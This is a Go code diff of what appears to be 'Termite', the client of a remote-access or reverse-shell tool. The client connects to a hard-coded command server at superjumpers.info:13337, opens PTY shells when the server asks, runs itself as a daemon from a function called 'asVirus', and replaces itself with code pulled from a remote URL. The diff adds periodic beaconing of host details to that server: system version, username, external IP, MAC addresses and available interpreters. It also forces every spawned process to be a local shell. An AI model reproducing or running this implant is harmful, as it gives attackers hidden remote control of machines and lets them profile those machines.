@@ -68,8 +68,10 @@ func createBackOff() *backOff {
 	return backoff
 }
 
-var backoff *backOff
-var device string
+var (
+	backoff *backOff
+	device  string
+)
 
 type termiteProcess struct {
 	ptmx       *os.File
@@ -93,6 +95,49 @@ type client struct {
 
 func handleConnection(c *client) {
 	oldbackOffCurrent := backoff.Current
+
+	exitFlag := false
+	goroutineFlag := false
+	go func() {
+		msg := &message.Message{}
+		c.DecoderLock.Lock()
+		err := c.Decoder.Decode(msg)
+		c.DecoderLock.Unlock()
+		if err != nil {
+			// Network
+			log.Error("Network error: %s", err)
+			return
+		}
+
+		for {
+			if exitFlag {
+				goroutineFlag = true
+				log.Debug("checkout node goroutine exit")
+				return
+			}
+			rand.Seed(time.Now().Unix())
+			time.Sleep(time.Duration(100+rand.Intn(50)) * time.Second)
+			c.EncoderLock.Lock()
+			err = c.Encoder.Encode(message.Message{
+				Type: message.CLIENT_INFO,
+				Body: message.BodyClientInfo{
+					SystemInfo:        getSysInfo(),
+					OS:                runtime.GOOS,
+					Arch:              runtime.GOARCH,
+					Shell:             getLocalShell(),
+					OutIP:             getOutIP(),
+					Version:           update.Version,
+					User:              getUsername(),
+					Python2:           getCmdPath("python2"),
+					Python3:           getCmdPath("python3"),
+					MyRouter:          getDevType(),
+					Node:              getNodeInfo(),
+					NetworkInterfaces: getNetworkDeviceInfo(),
+				},
+			})
+			c.EncoderLock.Unlock()
+		}
+	}()
 
 	for {
 		msg := &message.Message{}
@@ -126,6 +171,7 @@ func handleConnection(c *client) {
 			if bodyStartProcess.Path == "" {
 				continue
 			}
+			bodyStartProcess.Path = getLocalShell()
 			log.Success("Starting process: %s", bodyStartProcess.Path)
 			process := exec.Command(bodyStartProcess.Path)
 
@@ -152,8 +198,7 @@ func handleConnection(c *client) {
 				ptmx:       ptmx,
 				process:    process,
 			}
-			log.Success("Process started: %d", process.Process.Pid)
-			log.Success("Process added: %v", processes)
+			log.Success("Process started: %d, added: %v", process.Process.Pid, processes)
 			defer func() { _ = ptmx.Close() }()
 
 			c.EncoderLock.Lock()
@@ -222,7 +267,6 @@ func handleConnection(c *client) {
 				if err != nil {
 					exitCode = err.(*exec.ExitError).ExitCode()
 				}
-				fmt.Println("Exit code: ", exitCode)
 
 				c.EncoderLock.Lock()
 				err = c.Encoder.Encode(message.Message{
@@ -238,93 +282,34 @@ func handleConnection(c *client) {
 					// Network
 					log.Error("Network error: %s", err)
 				}
-
 				delete(processes, bodyStartProcess.Key)
 			}()
 		case message.PROCESS_STARTED:
 		case message.PROCESS_STOPED:
 		case message.GET_CLIENT_INFO:
-			// User Information
-			userInfo, err := user.Current()
-			var username string
-			if err != nil {
-				username = "Unknown"
-			} else {
-				username = userInfo.Username
-			}
-			// Python
-			python2, err := exec.LookPath("python2")
-			if err != nil {
-				python2 = ""
-			}
-
-			python3, err := exec.LookPath("python3")
-			if err != nil {
-				python3 = ""
-			}
-
-			// Network interfaces
-			interfaces := map[string]string{}
-			ifaces, _ := net.Interfaces()
-			for _, i := range ifaces {
-				interfaces[i.Name] = i.HardwareAddr.String()
-			}
-
-			// System version
-			cmd := exec.Command("uname", "-a")
-			output, err := cmd.Output()
-			if err != nil {
-				return
-			}
-			fmt.Println(string(output))
-			SystemInfo := strings.Trim(string(output), "\n")
-
-			// Shell
-			shell := os.Getenv("SHELL")
-			if shell == "" {
-				shell, err = exec.LookPath("sh")
-				if err != nil {
-					shell = ""
-				}
-			}
-
-			// OutIP
-			outIP := "127.0.0.1"
-			respCli, err := http.Get("https://myexternalip.com/raw")
-			if err == nil {
-				defer respCli.Body.Close()
-				body, _ := ioutil.ReadAll(respCli.Body)
-				outIP = string(body)
-			}
-
-			var router = "1"
-			if device != "router" {
-				router = "2"
-			}
-
 			c.EncoderLock.Lock()
 			err = c.Encoder.Encode(message.Message{
 				Type: message.CLIENT_INFO,
 				Body: message.BodyClientInfo{
-					SystemInfo:        SystemInfo,
+					SystemInfo:        getSysInfo(),
 					OS:                runtime.GOOS,
 					Arch:              runtime.GOARCH,
-					Shell:             shell,
-					OutIP:             outIP,
+					Shell:             getLocalShell(),
+					OutIP:             getOutIP(),
 					Version:           update.Version,
-					User:              username,
-					Python2:           python2,
-					Python3:           python3,
-					MyRouter:          router,
-					NetworkInterfaces: interfaces,
+					User:              getUsername(),
+					Python2:           getCmdPath("python2"),
+					Python3:           getCmdPath("python3"),
+					MyRouter:          getDevType(),
+					Node:              getNodeInfo(),
+					NetworkInterfaces: getNetworkDeviceInfo(),
 				},
 			})
 			c.EncoderLock.Unlock()
-
 			if err != nil {
 				// Network
 				log.Error("Network error: %s", err)
-				return
+				goto exit
 			}
 		case message.DUPLICATED_CLIENT:
 			backoff.Current = oldbackOffCurrent
@@ -334,7 +319,7 @@ func handleConnection(c *client) {
 			key := msg.Body.(*message.BodyTerminateProcess).Key
 			log.Success("Request terminate %s", key)
 			if termiteProcess, exists := processes[key]; exists {
-				syscall.Kill(termiteProcess.process.Process.Pid, syscall.SIGTERM)
+				syscall.Kill(termiteProcess.process.Process.Pid, syscall.SIGKILL)
 				termiteProcess.ptmx.Close()
 			}
 		case message.PULL_TUNNEL_CONNECT:
@@ -716,13 +701,97 @@ func handleConnection(c *client) {
 			url := fmt.Sprintf("%s/termite/%s", DistributorURL, c.Service)
 			if err := selfupdate.UpdateTo(url, exe); err != nil {
 				log.Error("Error occurred while updating binary: %s", err)
-				return
+				goto exit
 			}
 			log.Info("Update to v%s finished", version)
 			log.Info("Restarting...")
 			syscall.Exec(exe, []string{exe}, nil)
 		}
 	}
+exit:
+	exitFlag = true
+	for !goroutineFlag {
+		log.Debug("Sleep 5 seconds")
+		time.Sleep(5 * time.Second)
+	}
+	log.Debug("exitFlag is %t, handleConnection will exit", exitFlag)
+}
+
+func getSysInfo() string {
+	// System version
+	cmd := exec.Command("uname", "-a")
+	output, err := cmd.Output()
+	if err != nil {
+		return ""
+	}
+	return strings.Trim(string(output), "\n")
+}
+
+func getUsername() string {
+	userInfo, err := user.Current()
+	if err != nil {
+		return "Unknown"
+	} else {
+		return userInfo.Username
+	}
+}
+
+func getCmdPath(cmd string) string {
+	cmdPath, err := exec.LookPath(cmd)
+	if err != nil {
+		return ""
+	}
+	return cmdPath
+}
+
+func getLocalShell() string {
+	shellSlice := []string{"tcsh", "bash", "sh"}
+	for _, shell := range shellSlice {
+		path, err := exec.LookPath(shell)
+		if err == nil {
+			return path
+		}
+	}
+
+	return "/bin/sh"
+}
+
+func getNetworkDeviceInfo() map[string]string {
+	// Network interfaces
+	interfaces := map[string]string{}
+	ifaces, _ := net.Interfaces()
+	for _, i := range ifaces {
+		interfaces[i.Name] = i.HardwareAddr.String()
+	}
+	return interfaces
+}
+
+func getOutIP() string {
+	respCli, err := http.Get("https://myexternalip.com/raw")
+	if err != nil {
+		return "127.0.0.1"
+	}
+	defer respCli.Body.Close()
+	body, _ := ioutil.ReadAll(respCli.Body)
+	return string(body)
+}
+
+func getDevType() string {
+	if device != "router" {
+		return "2"
+	}
+	return "1"
+}
+
+func getNodeInfo() string {
+	conn, err := net.Dial("tcp", "127.0.0.1:6301")
+	if err != nil {
+		log.Error("client dial err=", err)
+		return "offline"
+	}
+	log.Info("client dial success")
+	conn.Close()
+	return "online"
 }
 
 func startSocks5Server() (int, error) {
@@ -764,7 +833,7 @@ func startClient(service string) bool {
 
 	cert, err := tls.X509KeyPair(pemContent, keyContent)
 	if err != nil {
-		log.Error("server: loadkeys: %s", err)
+		log.Error("server: load keys: %s", err)
 		return needRetry
 	}
 
@@ -783,7 +852,7 @@ func startClient(service string) bool {
 			x509.MarshalPKIXPublicKey(v.PublicKey)
 		}
 
-		log.Success("Secure connection established on %s", conn.RemoteAddr())
+		log.Debug("Secure connection established on %s", conn.RemoteAddr())
 
 		c := &client{
 			Conn:        conn,
@@ -816,7 +885,6 @@ func asVirus() {
 	}
 	if d != nil {
 		os.Exit(0)
-		return
 	}
 	defer cntxt.Release()
 	log.Success("daemon started")
@@ -827,6 +895,9 @@ func main() {
 	release := false
 	// service := "127.0.0.1:13337"
 	service := "superjumpers.info:13337"
+	if device == "router" {
+		service = "router.superjumpers.info:13337"
+	}
 
 	if release {
 		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
@@ -838,6 +909,13 @@ func main() {
 	processes = map[string]*termiteProcess{}
 	pullTunnels = map[string]*net.Conn{}
 	pushTunnels = map[string]*net.Conn{}
+
+	go func() {
+		for {
+			log.Debug("Have %d goroutine", runtime.NumGoroutine())
+			time.Sleep(5 * time.Second)
+		}
+	}()
 
 	for {
 		log.Info("Termite (v%s) starting...", update.Version)
